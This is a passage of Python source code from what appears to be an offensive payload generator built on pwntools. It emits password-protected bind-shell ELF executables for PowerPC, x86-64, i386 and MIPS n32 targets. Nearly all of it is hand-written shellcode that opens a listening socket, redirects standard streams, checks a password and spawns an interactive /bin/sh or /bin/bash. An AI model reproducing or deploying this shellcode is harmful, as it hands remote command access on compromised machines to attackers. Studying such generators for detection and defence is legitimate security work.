	context.arch = 'powerpc'
	context.endian = 'big'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	#print(listen_port)
	handle_port='0x'+enhex(p16(listen_port))
	#print(handle_port)
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).ljust(8,"0")
	passwd_high = passwd[:6]
	passwd_low  = "0x"+passwd[6:10]

	
	shellcode = '''
	.section .shellcode,"awx"
	.global _start
	.global __start
	.p2align 2
	_start:
	__start:
	'''



	shellcode += '''
	mr    r31,r1
	li    r3,2
	li    r4,1
	li    r5,0
	li    r0,0x146
	sc
	mr    r17,r3
	li    r4, 1
	li    r5, 0xf
	mr    r6, r31
	li    r7, 4
	li    r0, 153
	sc    
	xor   r7, r7, r7
	mr    r3, r17
	xor   r9,r9,r9
	stw   r9, 28(r31)
	stw   r9, 32(r31)
	stw   r9, 36(r31)
	stw   r9, 36(r31)
	stw   r9, 40(r31)
	stw   r9, 44(r31)
	stw   r9, 48(r31)
	stw   r9, 52(r31)
	stw   r9, 56(r31)
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 2
	sth   r9, 28(r31)
	li    r9, %s
	sth   r9, 30(r31)
	stw   r5, 32(r31)
	addi  r4, r31, 0x1c
	li   r5, 0x10
	li   r0, 0x147
	sc
	xor  r5, r5, r5
	mr   r3, r17
	li   r4, 0x101
	li   r0, 0x149
	sc
	mr   r3, r17
	li   r4, 0
	li   r5, 0
	li   r0, 0x14a
	sc
	mr   r16, r3
	li   r4, 0
	li   r0, 0x3f
	sc
	mr   r3, r16
	li   r4, 1
	sc
	mr   r3, r16
	li   r4, 2
	sc
	lis  r9, 0x5061
	ori  r9, r9, 0x7373
	stw  r9, -20(r31)
	lis  r9, 0x7764
	ori  r9, r9, 0x3a20
	stw  r9, -16(r31)
	li   r3, 1
	addi r4, r31 ,-20
	li   r5, 8
	li   r0, 4
	sc
	lis  r20, %s
	ori  r20, r20, %s
	li   r0, 3
	li   r3, 0
	addi r4, r31, -32
	li   r5, %s
	sc
	lwz    r10, -32(r31)
	cmpw   cr7, r10,r20
	bne    cr7, 0x30;
	lis    r9, 0x2f62
	ori    r9, r9, 26990
	stw   r9, 48(r31)
	xor  r9, r9, r9
	lis    r9, 0x2f73
	ori   r9, r9, 26624
	stw   r9, 52(r31)
	addi  r3, r31,0x30
	stwu  r3, 0(r31)
	mr    r4, r31
	xor   r5, r5, r5
	li    r0, 0xb
	sc
	main_exit:
	xor 3,3,3
	li  0,0xea
	sc
	main_lab:
	mr  3, 11
	xor 4,4,4
	xor 5,5,5
	xor 6,6,6
	li  0,0x72
	sc
	b _start
	nop
	'''
	shellcode = shellcode%(handle_port, passwd_high, passwd_low, passwd_len)

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode,filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



def sparc_power_bind_shell(shell_path ,listen_port, passwd, envp ,sleep_time,filename=None):
	pass


def spac64_power_bind_shell(shell_path ,listen_port, passwd, envp ,sleep_time ,filename=None):
	pass




def x64_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
	context.arch = 'amd64'
	context.endian = 'little'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd)
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	#passwd = '0x'+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd = "0x"+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode = shellcraft.fork()
	shellcode += '''
cmp rax,0
jnz main_lab
	'''
	shellcode += '''
push   0x29
pop    rax
push   0x2
pop    rdi
push   0x1
pop    rsi
xor    rdx,rdx
syscall
mov    r15,rax
	'''
	shellcode += shellcraft.setsockopt("rax",1,0xf,"rsp",4)
	shellcode +='''
push   r15
pop    rdi
xor    rdx, rdx
push   rdx
push   rdx
pushw  %s
pushw  0x2
push   0x31
pop    rax
push   rsp
pop    rsi
mov    dl,0x10
syscall
push  0x32
pop    rax
push   0x2
pop    rsi
syscall 
push   0x2b
pop    rax
xor    rsi,rsi
cdq    
syscall 
push   rax
pop    rdi
push   0x2
pop    rsi
push   0x21
pop    rax
syscall
push   rax
pop    rdi
push   0x2
pop    rsi
push   0x21
pop    rax
syscall
dec    rsi
jns    $-8
push   0x1
pop    rax
movabs r9,0x203a647773736150
push   r9
mov    rsi,rsp
push   0x8
pop    rdx
syscall
mov    rdx, %s
xor    rax,rax
add    rsi,0x8
syscall 
movabs rax,%s
push   rsi
pop    rdi
scas   rax,QWORD PTR es:[rdi]
jne    $+0x1e
	'''

	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)

	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	push 61
	pop rax
	xor rdi,rdi
	syscall
	jmp _start
	'''
	shellcode = asm(shellcode%(listen_port, passwd_len, passwd))
	ELF_data =make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename = context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def x86_power_bind_shell(shell_path ,listen_port , passwd, envp,filename=None):
	context.arch = 'i386'
	context.endian = 'little'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)

	shellcode = shellcraft.fork()

	shellcode += '''
cmp eax, 0
jne main_lab
	'''
	
	shellcode += '''
push 0x1
pop ebx
xor edx,edx
push edx
push 0x66
pop eax
push ebx
push 0x2
mov ecx,esp
int 0x80
mov ebp, eax
'''
	shellcode += shellcraft.setsockopt("eax",1,0xf,"esp",4)
	
	shellcode += '''
xor edx,edx
	'''

	shellcode +='''
mov esi,ebp
push 0x66
pop eax
mov ebx,0x2
push dx
push %s
push bx
mov ecx,esp
push 0x10
push ecx
push esi
mov ecx,esp
int 0x80
push 0x66
pop eax
mov bl,4
push 0
push esi
mov ecx,esp
int 0x80
push 0x66
pop eax
inc ebx
push edx
push edx
push esi
mov ecx,esp
int 0x80
mov ebx,eax
xor ecx,ecx
mov cl,2
mov al,0x3f
int 0x80
dec ecx
jns $-5
push 0x003a6477
push 0x73736150
mov  ecx,esp
push 4
pop  eax
push 8
pop  edx
int 0x80
push 3
pop eax
xor ecx,ecx
sub esp,8
mov ecx,esp
push %s
pop edx
int 0x80
mov edi,[esp]
cmp edi,%s
jne $+80
	'''
	shellcode = shellcode%(listen_port, passwd_len, passwd)

	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)

	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4(0,0,0,0)

	shellcode += '''
jmp _start
	'''
	shellcode = asm(shellcode)
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

'''
0x0017a5 setsocktopt
'''

def mips32n_power_bind_shell(shell_path ,listen_port , passwd, envp,filename=None):
	context.architectures['mipsn32'] = {'endian': 'big', 'bits': 32}
	context.arch = 'mipsn32'
	context.endian = "big"
	context.bits = "32"
	if(my_package.get_mipsn32_binutils(context.arch) == 1):
		return 
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = len(passwd)
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
	shellcode = """
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	"""
 
	shellcode += """
li      $a0, 0x1200012
li      $a1, 0
li      $a2, 0
li      $a3, 0
li      $v0, 0x17a7
syscall 0x40404
	"""

	shellcode += '''
move  $s5, $v0
bnez $v0, main_lab
nop
	'''
 
	shellcode_socket = '''
li      $t9, -3
nor     $a0, $t9, $zero
li      $t9, -3
nor     $a1, $t9, $zero
slti    $a2, $zero, -1
li      $v0, 0x1798
syscall 0x40404
	'''



	shellcode += shellcode_socket

	shellcode += '''
move $s7, $v0
	'''

	shellcode += '''
li      $v0, 1
sw      $v0, 0($sp)
move    $v1, $sp
sw      $s7, 4($sp)
li      $a4, 4
move    $a3, $v1
li      $a2, 512
li      $a1, 0xffff
move    $a0, $s7
li      $v0, 0x0017a5
syscall 0x40404
	'''

 
	shellcode +='''
li      $t3,0x7350
andi    $s0,$v0,0xffff
li      $t2,-17
nor     $t2,$t2,$zero
li      $t1, -3
nor     $t1,$t1,$zero
sllv    $t1,$t1,$t2
li      $t2,%s
or      $t1,$t1,$t2
sw      $t1,-32($sp)
sw      $zero,-28($sp)
sw      $zero,-24($sp)
sw      $zero,-20($sp)
move     $a0, $s7
li      $t2,-17
nor     $a2,$t2,$zero
daddi   $a1,$sp,-32
li      $v0,0x0017a0
syscall 0x40404
li      $t3,0x7350
move     $a0, $s7
li      $a1,2
li      $v0,0x0017a1
syscall
li      $t3,0x7350
move    $a0, $s7
slti    $a1,$zero,-1
slti    $a2,$zero,-1
li      $v0,0x00179a
syscall
move    $s7, $v0 
li      $t3,0x7350
andi    $s0,$v0,0xffff
or      $a0,$s0,$s0 
li      $t2,-3 
nor     $a1,$t2,$zero 
li      $v0,0x1790
syscall
li      $t3,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,0x0101
li      $v0,0x1790
syscall
li      $t3,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,-1
li      $v0,0x1790
syscall
	'''

	shellcode = shellcode%(listen_port)
 
	shellcode += '''
lui     $t1, 0x5061
ori     $t1, $t1, 0x7373
sw      $t1, -8($sp)
lui     $t9, 0x889b
ori     $t9, $t9, 0xc5ff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a1, $sp, $zero
sw      $s7, -4($sp)
lw      $a0, -4($sp)
li      $t9, -9
nor     $a2, $t9, $zero
li      $v0, 0x001771
syscall 0x40404
sw      $s7, -4($sp)
lw      $a0, -4($sp)
li      $t9, %d
nor     $a2, $t9, $zero
add     $a1, $sp, $zero
li      $v0, 0x001770
syscall 0x40404
li $s3, %s
lw $s1, ($sp)
addiu  $sp, $sp, -0x20
bne  $s1, $s3, main_exit
nop
'''	
	shellcode = shellcode%(~passwd_len, passwd)
 
	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode += """
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -8($sp)
lui     $t9, 0xd08c
ori     $t9, $t9, 0x97ff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a0, $sp, $zero
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -12($sp)
lui     $t9, 0xd08c
ori     $t9, $t9, 0x97ff
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
lui     $t9, 0xd296
ori     $t9, $t9, 0xffff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -13
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
		"""

	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += """
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -12($sp)
lui     $t1, 0x2f62
ori     $t1, $t1, 0x6173
sw      $t1, -8($sp)
lui     $t9, 0x97ff
ori     $t9, $t9, 0xffff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
add     $a0, $sp, $zero
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -16($sp)
lui     $t1, 0x2f62
ori     $t1, $t1, 0x6173
sw      $t1, -12($sp)
lui     $t9, 0x97ff
ori     $t9, $t9, 0xd296
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
sw      $zero, -4($sp)
addiu   $sp, $sp, -16
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -15
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
		"""

	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode += """
main_exit:
slti    $a0, $zero, -1
li      $v0, 0x00183d
syscall 0x40404
	"""

	shellcode += '''
main_lab:
	'''
#wait4
	shellcode += """
add     $a0, $s5, $zero
slti    $a1, $zero, -1
slti    $a2, $zero, -1
slti    $a3, $zero, -1
li      $v0, 0x0017ab
syscall 0x40404
	"""

	shellcode += '''
j __start
nop
	'''

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_add_arch_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_add_arch_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_add_arch_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def mips32nel_power_bind_shell(shell_path ,listen_port , passwd, envp,filename=None):
	context.architectures['mipsn32el'] = {'endian': 'little', 'bits': 32}
	context.arch = 'mipsn32el'
	context.endian = "little"
	context.bits = "32"
	if(my_package.get_mipsn32_binutils(context.arch) == 1):
		return 
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = len(passwd)
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
	shellcode = """
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	"""
 
	shellcode += """
li      $a0, 0x1200012
li      $a1, 0
li      $a2, 0
li      $a3, 0
li      $v0, 0x17a7
syscall 0x40404
	"""

	shellcode += '''
move  $s5, $v0
bnez $v0, main_lab
nop
	'''
 
	shellcode_socket = '''
li      $t9, -3
nor     $a0, $t9, $zero
li      $t9, -3
nor     $a1, $t9, $zero
slti    $a2, $zero, -1
li      $v0, 0x1798
syscall 0x40404
	'''



	shellcode += shellcode_socket

	shellcode += '''
move $s7, $v0
	'''
	shellcode += '''
li      $v0, 1
sw      $v0, 0($sp)
move    $v1, $sp
sw      $s7, 4($sp)
li      $a4, 4
move    $a3, $v1
li      $a2, 512
li      $a1, 0xffff
move    $a0, $s7
li      $v0, 0x0017a5
syscall 0x40404
	'''
 
	shellcode += '''
li      $t3,0x7350
andi    $s0,$v0,0xffff
li      $t2,-17
nor     $t2,$t2,$zero
li      $t1, %s
sllv    $t1,$t1,$t2
li      $t2,-3
nor     $t2,$t2,$zero
or      $t1,$t1,$t2
sw      $t1,-32($sp)
sw      $zero,-28($sp)
sw      $zero,-24($sp)
sw      $zero,-20($sp)
move    $a0, $s7
li      $t2,-17
nor     $a2,$t2,$zero
daddi   $a1,$sp,-32
li      $v0,0x0017a0
syscall 0x40404
li      $t3,0x7350
move    $a0, $s7
li      $a1,2
li      $v0,0x0017a1
syscall
li      $t3,0x7350
move    $a0, $s7
slti    $a1,$zero,-1
slti    $a2,$zero,-1
li      $v0,0x00179a
syscall
move $s7, $v0
li      $t3,0x7350
andi    $s0,$v0,0xffff
or      $a0,$s0,$s0 
li      $t2,-3 
nor     $a1,$t2,$zero 
li      $v0,0x1790
syscall
li      $t3,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,0x0101
li      $v0,0x1790
syscall
li      $t3,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,-1
li      $v0,0x1790
syscall
    '''
	shellcode = shellcode%(listen_port)
	shellcode += '''
lui     $t1, 0x7373
ori     $t1, $t1, 0x6150
sw      $t1, -8($sp)
lui     $t9, 0xffc5
ori     $t9, $t9, 0x9b88
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a1, $sp, $zero
add     $a0, $s7, $zero
li      $t9, -9
nor     $a2, $t9, $zero
li      $v0, 0x001771
syscall 0x40404
sw      $s7, -4($sp)
lw      $a0, -4($sp)
li      $t9, %d
nor     $a2, $t9, $zero
add     $a1, $sp, $zero
li      $v0, 0x001770
syscall 0x40404
li $s3, %s
lw $s1, ($sp)
bne  $s1, $s3, main_exit
nop
	'''	

	shellcode = shellcode%(~passwd_len, passwd)

	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode += """
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -8($sp)
lui     $t9, 0xff97
ori     $t9, $t9, 0x8cd0
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a0, $sp, $zero
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t9, 0xff97
ori     $t9, $t9, 0x8cd0
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
li      $t1, 0x692d
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -13
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
		"""

	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += """
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t1, 0x7361
ori     $t1, $t1, 0x622f
sw      $t1, -8($sp)
li      $t9, -105
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
add     $a0, $sp, $zero
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -16($sp)
lui     $t1, 0x7361
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t9, 0x96d2
ori     $t9, $t9, 0xff97
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
sw      $zero, -4($sp)
addiu   $sp, $sp, -16
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -15
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
		"""

	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
  
	shellcode += """
main_exit:
slti    $a0, $zero, -1
li      $v0, 0x00183d
syscall 0x40404
	"""

	shellcode += '''
main_lab:
	'''
#wait4
	shellcode += """
add     $a0, $s5, $zero
slti    $a1, $zero, -1
slti    $a2, $zero, -1
slti    $a3, $zero, -1
li      $v0, 0x0017ab
syscall 0x40404
	"""

	shellcode += '''
j __start
nop
	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_add_arch_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_add_arch_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_add_arch_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 